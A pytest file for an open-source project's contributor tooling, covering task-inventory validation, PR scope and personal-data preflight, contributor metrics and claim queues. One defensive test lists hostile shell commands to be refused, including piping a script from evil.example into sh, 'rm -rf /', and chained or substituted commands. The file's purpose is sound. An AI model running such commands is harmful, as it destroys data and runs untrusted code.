"""The campaign task inventory and its preflight must hold together.

A task inventory is only worth having if a bad row cannot enter it. The failure modes
that matter are not typos — they are the ones that waste a newcomer's evening: a task
that points at paths nobody may touch, a task that claims a container can produce
evidence only a human with hardware can produce, an id that two PRs both claim, and a
generated file that has quietly stopped matching the data it was generated from.

The schema is generated from `FIELD_SPEC` rather than hand-written, so these also assert
the two cannot drift apart — a schema nobody validates against is the dead-registry
pattern this repository has been bitten by before.
"""
from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture(scope="module")
def campaign():
    return _load("campaign")


@pytest.fixture(scope="module")
def preflight():
    return _load("campaign_preflight")


@pytest.fixture(scope="module")
def tasks(campaign):
    return campaign.load_tasks()


# ── The inventory itself ──────────────────────────────────────────────────────

def test_every_task_in_the_inventory_is_valid(campaign, tasks):
    errors = campaign.validate_inventory(tasks)
    assert not errors, "campaign/tasks.json is invalid:\n  " + "\n  ".join(errors)


def test_generated_files_are_in_sync(campaign, tasks):
    """Same contract as the docs generator: regenerate and commit, do not hand-edit."""
    stale = [
        str(p.relative_to(ROOT))
        for p, content in campaign.generate(tasks).items()
        if not p.exists() or p.read_text(encoding="utf-8") != content
    ]
    assert not stale, (
        f"generated campaign files are stale: {stale} — "
        "run `uv run python scripts/campaign.py --generate` and commit the result"
    )


def test_the_schema_is_derived_from_the_field_spec(campaign):
    """If someone hand-edits the JSON Schema, it stops describing the validator."""
    schema = json.loads((ROOT / "campaign" / "schemas" / "task.schema.json").read_text())
    assert set(schema["properties"]) == set(campaign.FIELD_SPEC), (
        "the committed schema's fields differ from FIELD_SPEC — FIELD_SPEC is the source "
        "of truth; regenerate rather than editing the schema"
    )
    required = {n for n, (_t, req, _d) in campaign.FIELD_SPEC.items() if req}
    assert set(schema["required"]) == required


def test_open_tasks_point_at_paths_that_exist(tasks):
    """A task whose allowed_paths are fiction cannot be completed or preflighted."""
    bad: list[str] = []
    for t in tasks:
        if t["state"] != "open":
            continue
        for pattern in t["allowed_paths"]:
            root = pattern.split("*")[0].rstrip("/")
            if not root:
                continue
            # Either the literal path exists, or its parent directory does (the task
            # creates a new file inside a real directory — README.fr.md, examples/x.toml).
            p = ROOT / root
            if not (p.exists() or p.parent.is_dir()):
                bad.append(f"{t['id']}: {pattern}")
    assert not bad, "open tasks reference paths that do not exist:\n  " + "\n  ".join(bad)


def test_no_open_task_is_advertised_as_architecture_work(tasks):
    assert not [t["id"] for t in tasks if t["state"] == "open" and t["risk"] == "L3"]


def test_feature_wiring_tasks_track_the_live_registry():
    """A wiring task for an already-wired capability sends someone to do nothing.

    The registry is the truth; this catches the inventory going stale behind it, which
    is guaranteed to happen as capabilities get wired.
    """
    from yazses.system.features import _UNWIRED

    campaign_mod = _load("campaign")
    stale = []
    for t in campaign_mod.load_tasks():
        if t["family"] != "feature-wiring":
            continue
        slug = t["id"].removeprefix("WIRE-").removesuffix("-001").lower().replace("-", "_")
        if slug not in _UNWIRED:
            stale.append(f"{t['id']} (slug {slug!r} is no longer unwired)")
    assert not stale, (
        "feature-wiring tasks exist for capabilities that are already wired:\n  "
        + "\n  ".join(stale)
        + "\nRemove them from campaign/tasks.json and regenerate."
    )


# ── Preflight: scope ──────────────────────────────────────────────────────────

@pytest.mark.parametrize(
    "path,allowed,expected",
    [
        ("SHOWCASE.md", ["SHOWCASE.md"], True),
        ("src/yazses/core/daemon.py", ["src/yazses/**"], True),
        ("src/yazses/a/b/c/d.py", ["src/yazses/**"], True),
        ("examples/vscode.toml", ["examples/**"], True),
        ("examples/nested/deep.toml", ["examples/**"], True),
        ("pyproject.toml", ["src/yazses/**"], False),
        ("uv.lock", ["examples/**"], False),
        (".github/workflows/test.yml", ["docs/**"], False),
        ("README.fr.md", ["README.fr.md", "README.md"], True),
    ],
)
def test_path_allowed(preflight, path, allowed, expected):
    assert preflight.path_allowed(path, allowed) is expected


def test_check_paths_names_every_file_outside_scope(preflight):
    outside = preflight.check_paths(
        ["docs/a.md", "pyproject.toml", "uv.lock"], ["docs/**"]
    )
    assert outside == ["pyproject.toml", "uv.lock"]


def test_a_lockfile_bump_smuggled_into_a_docs_task_is_caught(preflight):
    """The specific thing that makes a cheap review expensive."""
    assert preflight.check_paths(["docs/faq.md", "uv.lock"], ["docs/**"]) == ["uv.lock"]


# ── Preflight: task id ────────────────────────────────────────────────────────

def test_find_task_id_prefers_the_explicit_line(preflight):
    body = "## Task\nTask ID: APP-001\nCloses #43"
    assert preflight.find_task_id(body, {"APP-001"}) == "APP-001"


def test_find_task_id_accepts_lowercase_label(preflight):
    assert preflight.find_task_id("task-id: mic-004", {"MIC-004"}) == "MIC-004"


def test_find_task_id_falls_back_to_a_known_bare_id(preflight):
    """People put the id in the title and nowhere else."""
    assert preflight.find_task_id("Add a config for kitty (APP-014)", {"APP-014"}) == "APP-014"


def test_find_task_id_ignores_unknown_bare_tokens(preflight):
    """Otherwise 'MIT-LICENSE' or 'UTF-8' in a PR body becomes a task id."""
    assert preflight.find_task_id("Relicensed under MIT-LICENSE, encoded UTF-8", {"APP-001"}) is None


def test_no_task_id_is_not_a_failure(preflight):
    ok, report = preflight.render_report(
        task_id=None, task=None, changed=["a.md"], outside=[], findings=[]
    )
    assert ok is True
    assert "does not block you" in report


def test_an_unknown_task_id_fails_without_blaming_the_contributor(preflight):
    ok, report = preflight.render_report(
        task_id="NOPE-001", task=None, changed=[], outside=[], findings=[]
    )
    assert ok is False
    assert "not something you need to fix alone" in report


# ── Preflight: personal data ──────────────────────────────────────────────────

@pytest.mark.parametrize(
    "text",
    [
        # A fabricated username on purpose: a fixture must never carry a real person's
        # home path, least of all in the file that teaches the scanner to find them.
        "+ model path: /home/alice/.cache/yazses",
        "+ /Users/janedoe/Library/Application Support/yazses",
        r"+ C:\Users\Jane\AppData\yazses",
        "+ contact me at real.person@gmail.com",
        "+ token=ghp_abcdefghijklmnopqrstuvwxyz0123",
    ],
)
def test_personal_data_is_detected(preflight, text):
    assert preflight.scan_personal_data(text), f"missed personal data in {text!r}"


@pytest.mark.parametrize(
    "text",
    [
        "+ /home/user/.config/yazses      # the documented placeholder",
        "+ /home/runner/work/yazses       # a CI path, not a person",
        "+ write to you@example.com",
        "+ MSKazemi@users.noreply.github.com",
        "+ see https://github.com/MSKazemi/yazses for details",
        "+ uv run python -m pytest tests/ -v",
        "+ | Blue Yeti | USB condenser | Ubuntu 24.04 | 0.004 | works well |",
    ],
)
def test_ordinary_content_is_not_flagged(preflight, text):
    """A false positive on someone's first PR costs more than it saves."""
    assert preflight.scan_personal_data(text) == [], f"false positive on {text!r}"


SAMPLE_DIFF = """\
diff --git a/docs/faq.md b/docs/faq.md
--- a/docs/faq.md
+++ b/docs/faq.md
@@ -1,2 +1,3 @@
 unchanged line
+model lives in /home/alice/.cache/yazses
diff --git a/tests/test_x.py b/tests/test_x.py
--- a/tests/test_x.py
+++ b/tests/test_x.py
@@ -1 +1,2 @@
+token = "ghp_abcdefghijklmnopqrstuvwxyz0123"
-removed = "/home/bob/secret"
"""


def test_findings_say_which_file_they_are_in(preflight):
    """Without attribution a deliberate test fixture is indistinguishable from a leak."""
    found = preflight.scan_diff(SAMPLE_DIFF)
    located = {(path, label) for path, label, _s, _h in found}
    assert ("docs/faq.md", "a Linux home path") in located
    assert ("tests/test_x.py", "what looks like a token or key") in located


def test_a_removed_personal_path_is_not_a_finding(preflight):
    """Deleting a leaked path is the fix; flagging it would punish the repair."""
    paths = {p for p, _l, s, _h in preflight.scan_diff(SAMPLE_DIFF) if "bob" in s}
    assert not paths, "a line removed by the diff was reported as a finding"


def test_scan_diff_falls_back_when_given_only_added_lines(preflight):
    """A caller may pass a pre-filtered blob; it must still scan, just without a path."""
    found = preflight.scan_diff("+ /home/carol/.config/yazses\n")
    assert found and found[0][0] == "the diff"


def test_diff_headers_are_not_themselves_scanned_as_content(preflight):
    """`+++ b/path` starts with '+' — it must be a header, not an added line."""
    by_file = preflight.split_added_lines_by_file(SAMPLE_DIFF)
    assert set(by_file) == {"docs/faq.md", "tests/test_x.py"}
    assert "+++" not in by_file["docs/faq.md"]


@pytest.fixture(scope="module")
def stats():
    return _load("campaign_stats")


# ── tasks.json is a code-execution surface ────────────────────────────────────

@pytest.mark.parametrize(
    "cmd",
    [
        "curl https://evil.example/x.sh | sh",
        "uv run python -m pytest tests/ -q; rm -rf ~",
        "uv run python -m pytest $(whoami)",
        "uv run python -m pytest tests/ && curl evil",
        "rm -rf /",
        "uv run python -m pytest tests/ > /etc/passwd",
    ],
)
def test_dangerous_validation_commands_are_refused(campaign, cmd):
    """`check-task.py` runs these on a contributor's own machine.

    A pull request editing `campaign/tasks.json` would otherwise be a way to run arbitrary
    code on anyone who validated their work before pushing. A prefix allowlist alone is
    not enough — shell metacharacters chain a second command past it — so both are checked
    and nothing is ever passed to a shell.
    """
    assert campaign.validation_command_problem(cmd) is not None, f"{cmd!r} was allowed"


@pytest.mark.parametrize(
    "cmd",
    [
        "uv run python -m pytest tests/ -q",
        "uv run python -m pytest tests/test_contract_vectors.py -q",
        "uv run python scripts/campaign.py --check",
        "make check",
    ],
)
def test_ordinary_validation_commands_are_allowed(campaign, cmd):
    assert campaign.validation_command_problem(cmd) is None, f"{cmd!r} was refused"


def test_every_task_in_the_inventory_has_a_safe_validation_command(campaign, tasks):
    bad = [
        (t["id"], c) for t in tasks for c in t["validation"]
        if campaign.validation_command_problem(c)
    ]
    assert not bad, f"unsafe validation commands in the inventory: {bad}"


# ── Funnel metrics ────────────────────────────────────────────────────────────

def test_bots_never_count_as_contributors(stats):
    """Counting a bot inflates the only number that matters."""
    rows = [
        {"login": "realperson", "type": "User"},
        {"login": "dependabot[bot]", "type": "Bot"},
        {"login": "github-actions", "type": "User"},  # a bot NOT marked as one
        {"login": "allcontributors", "type": "User"},
    ]
    assert stats.human_contributors(rows) == ["realperson"]


def test_attribution_gaps_finds_uncredited_merged_authors(stats):
    """The silent failure: work merged, credit not shown.

    Usually the commit's author email is not connected to their GitHub account.
    """
    gaps = stats.attribution_gaps(
        merged_authors=["alice", "bob", "dependabot[bot]", "alice"],
        contributor_logins=["alice", "carol"],
    )
    assert gaps == ["bob"], "bob merged a PR and is absent from the contributors API"


def test_attribution_comparison_is_case_insensitive(stats):
    """GitHub logins are case-preserving but not case-sensitive; a case mismatch
    would invent a gap and send someone chasing a problem that does not exist."""
    assert stats.attribution_gaps(["Alice"], ["alice"]) == []


@pytest.mark.parametrize(
    "body,expected",
    [
        ("Cohort: india-foss-club-01", "india-foss-club-01"),
        ("cohort = ZH-Wayland-Article", "zh-wayland-article"),
        ("no cohort mentioned here", None),
        (None, None),
        ("This cohort of users is large", None),  # prose, not a field
    ],
)
def test_cohort_is_read_only_from_an_explicit_field(stats, body, expected):
    assert stats.cohort_of(body) == expected


def test_cohort_funnel_counts_distinct_merged_authors(stats):
    prs = [
        {"body": "Cohort: a", "user": {"login": "u1"}, "merged_at": "2026-08-01"},
        {"body": "Cohort: a", "user": {"login": "u1"}, "merged_at": "2026-08-02"},
        {"body": "Cohort: a", "user": {"login": "u2"}, "merged_at": None},
        {"body": "Cohort: b", "user": {"login": "bot[bot]"}, "merged_at": "2026-08-03"},
    ]
    funnel = stats.cohort_funnel(prs)
    assert funnel["a"] == {"prs": 3, "merged": 2, "authors_merged": 1}
    assert "b" not in funnel, "a bot's PR must not create a cohort"


def test_no_email_address_ever_reaches_the_output(stats):
    """Attribution debugging needs to know an email is unconnected, never what it is."""
    summary = stats.summarize(
        contributors=["alice"],
        merged_authors=["bob"],
        prs=[{"body": "Cohort: x", "user": {"login": "bob"}, "merged_at": "2026-08-01"}],
    )
    rendered = stats.render(summary)
    assert "@" not in rendered.replace("@bob", ""), "an address leaked into the report"
    assert "bob" in rendered


def test_promotion_pauses_when_the_review_queue_is_too_long(stats):
    """Nobody should have to remember thresholds while a campaign is busy."""
    prs = [{"state": "open", "user": {"login": f"u{i}"}, "body": ""} for i in range(30)]
    summary = stats.summarize(contributors=["a"], merged_authors=[], prs=prs)
    assert summary["promotion"] == "PAUSED"
    assert "awaiting review" in " ".join(summary["stop_reasons"])
    assert "PROMOTION: PAUSED" in stats.render(summary)


def test_promotion_pauses_when_contributors_are_going_uncredited(stats):
    """Recruiting more people while existing ones show no credit is the wrong order."""
    summary = stats.summarize(
        contributors=["a"], merged_authors=["x", "y", "z"], prs=[]
    )
    assert summary["promotion"] == "PAUSED"
    assert "not credited" in " ".join(summary["stop_reasons"])


def test_promotion_is_ok_on_a_healthy_queue(stats):
    summary = stats.summarize(contributors=["a", "b"], merged_authors=["a"], prs=[])
    assert summary["promotion"] == "OK"
    assert summary["stop_reasons"] == []
    assert "PROMOTION: OK" in stats.render(summary)


def test_report_says_so_when_it_had_to_fall_back_to_git(stats):
    """Numbers the script cannot stand behind must be labelled, not printed plain."""
    summary = stats.summarize(contributors=["a"], merged_authors=[], prs=[])
    assert "lower bound" in stats.render(summary, degraded=True)
    assert "lower bound" not in stats.render(summary, degraded=False)


@pytest.fixture(scope="module")
def queue():
    return _load("campaign_queue")


NOW = __import__("datetime").datetime(2026, 8, 11, 12, 0, tzinfo=__import__("datetime").timezone.utc)


def test_claims_are_recognised_in_the_words_people_actually_use(queue):
    comments = [
        {"user": {"login": "a"}, "body": "claiming APP-014", "created_at": "2026-08-11T10:00:00Z"},
        {"user": {"login": "b"}, "body": "I'll take MIC-003 please", "created_at": "2026-08-11T10:00:00Z"},
        {"user": {"login": "c"}, "body": "claim: VEC-SAFETY-001", "created_at": "2026-08-11T10:00:00Z"},
    ]
    got = {c["task_id"] for c in queue.parse_claims(comments, {"APP-014", "MIC-003", "VEC-SAFETY-001"})}
    assert got == {"APP-014", "MIC-003", "VEC-SAFETY-001"}


def test_a_token_that_merely_looks_like_a_task_id_is_not_a_claim(queue):
    comments = [{"user": {"login": "a"}, "body": "claiming UTF-8 support", "created_at": "2026-08-11T10:00:00Z"}]
    assert queue.parse_claims(comments, {"APP-014"}) == []


def test_bot_comments_never_create_claims(queue):
    comments = [{"user": {"login": "github-actions[bot]"}, "body": "claiming APP-014",
                 "created_at": "2026-08-11T10:00:00Z"}]
    assert queue.parse_claims(comments, {"APP-014"}) == []


def test_a_schema_task_lapses_in_48h_and_a_code_task_does_not(queue):
    """Different work deserves different rope: one sitting vs a working week."""
    tasks = {"L0T": {"risk": "L0"}, "L2T": {"risk": "L2"}}
    three_days_ago = "2026-08-08T12:00:00Z"
    claims = [
        {"task_id": "L0T", "who": "a", "at": three_days_ago},
        {"task_id": "L2T", "who": "b", "at": three_days_ago},
    ]
    lapsed = {c["task_id"] for c in queue.lapsed_claims(claims, tasks, NOW)}
    assert lapsed == {"L0T"}, "a 3-day-old L2 claim is still inside its 7-day window"


def test_a_fresh_claim_never_lapses(queue):
    claims = [{"task_id": "T", "who": "a", "at": "2026-08-11T11:00:00Z"}]
    assert queue.lapsed_claims(claims, {"T": {"risk": "L0"}}, NOW) == []


def test_lapsed_claim_wording_does_not_blame_anyone(queue):
    """Expiry exists to free a task, not to mark someone as having failed."""
    text = queue.render_claims([{"task_id": "T", "who": "a", "lapsed_hours": 5.0}], total=1)
    assert "not a failure" in text
    assert "untouched" in text


def test_a_first_pull_request_outranks_routine_work_of_equal_age(queue):
    """The first PR is the one most likely to be abandoned in silence."""
    old = "2026-08-10T12:00:00Z"
    first = {"number": 1, "updated_at": old, "risk": "L1", "first_pr": True}
    routine = {"number": 2, "updated_at": old, "risk": "L1", "first_pr": False}
    assert queue.review_priority(first, now=NOW) > queue.review_priority(routine, now=NOW)


def test_a_longer_wait_outranks_a_shorter_one(queue):
    older = {"number": 1, "updated_at": "2026-08-09T12:00:00Z", "risk": "L1"}
    newer = {"number": 2, "updated_at": "2026-08-11T11:00:00Z", "risk": "L1"}
    assert queue.review_priority(older, now=NOW) > queue.review_priority(newer, now=NOW)


def test_an_empty_queue_says_nobody_is_waiting(queue):
    assert "nobody is waiting" in queue.render_queue([], now=NOW)


I18N = ROOT / "i18n"


def test_the_translation_module_map_points_at_sections_that_exist():
    """The module map names `README.md` sections. If one is renamed the map rots and
    sends a translator to a heading that is not there — the same unreachable-instruction
    failure as a link to a file git does not ship.
    """
    readme_headings = {
        line.removeprefix("## ").strip().lower()
        for line in (ROOT / "README.md").read_text(encoding="utf-8").splitlines()
        if line.startswith("## ")
    }
    # The map is data (`modules.yml`), not prose, precisely so this is checkable.
    # Parsed with a small reader rather than a YAML dependency — the repo runs an 18
    # package base budget and a translation map is not a reason to widen it.
    raw = (I18N / "modules.yml").read_text(encoding="utf-8")
    cited = [s.strip().strip('"') for line in raw.splitlines()
             if line.strip().startswith("sections:")
             for s in line.split("[", 1)[1].rstrip("]").split('", "')]
    cited = [c.strip('"[] ') for c in cited if c.strip('"[] ')]
    assert cited, "no sections found in i18n/modules.yml — did the format change?"

    missing = [c for c in cited if c.lower() not in readme_headings]
    assert not missing, (
        f"i18n/modules.yml names README sections that do not exist: {missing} — "
        "a renamed heading rots the translation map silently, sending a translator "
        f"to a heading that is not there. Real headings: {sorted(readme_headings)}"
    )


def test_no_english_prose_is_duplicated_into_i18n():
    """The whole design decision: `README.md` stays the single source of the prose.

    A parallel English copy here would drift within weeks, silently, because nobody
    re-reads the copy.
    """
    stray = [p.name for p in I18N.glob("en/*.md")]
    assert not stray, (
        f"English prose copied into i18n/en/: {stray} — the module map references "
        "README.md sections instead, precisely so there is nothing to drift"
    )


def test_the_glossary_protects_the_tokens_that_break_when_translated():
    """A 'translated' command does not run. These must be listed as protected."""
    text = (I18N / "glossary.yml").read_text(encoding="utf-8")
    for token in ("yazses start", "[stt] model", "vad_threshold", "YazSes"):
        assert token in text, f"{token!r} is not listed as protected in the glossary"


def test_the_glossary_keeps_the_qualified_offline_claim():
    """Claims policy: 'offline' is always offline *by default*, never absolute."""
    text = (I18N / "glossary.yml").read_text(encoding="utf-8")
    assert "by default" in text, "the glossary must not license an absolute offline claim"


def test_report_is_actionable_when_scope_is_wrong(preflight, tasks):
    task = next(t for t in tasks if t["state"] == "open")
    ok, report = preflight.render_report(
        task_id=task["id"],
        task=task,
        changed=["uv.lock"],
        outside=["uv.lock"],
        findings=[],
    )
    assert ok is False
    assert "uv.lock" in report
    # It must tell them what they may touch and how to validate, not just say no.
    assert task["allowed_paths"][0] in report
    assert task["validation"][0] in report


def test_report_passes_a_clean_pr(preflight, tasks):
    task = next(t for t in tasks if t["state"] == "open")
    ok, _ = preflight.render_report(
        task_id=task["id"], task=task, changed=["SHOWCASE.md"], outside=[], findings=[]
    )
    assert ok is True
